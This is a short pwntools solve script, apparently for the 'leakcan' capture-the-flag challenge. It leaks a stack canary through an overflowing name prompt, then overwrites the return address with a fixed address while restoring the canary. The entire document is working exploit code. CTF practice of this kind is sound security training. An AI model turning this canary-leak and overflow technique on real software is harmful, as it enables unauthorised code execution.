from pwn import *
context(arch='amd64', log_level='debug')
 
context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./chall"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
#libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    #io = process(vuln_path)
    io = process([vuln_path])
else:
    io = remote("leakcan-25b8ac0dd7fd.tcp.1753ctf.com", 8435)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()


io.sendafter("name?\n", b"a"*0x59)
can = u64(io.recvuntil("\x01")[-8:-1].rjust(8, b"\x00"))
log.success("c:-----> " + hex(can))
ddebug()
io.sendline(b"a"*0x58 + p64(can) + p64(0) + p64(0x40194A))

io.interactive()
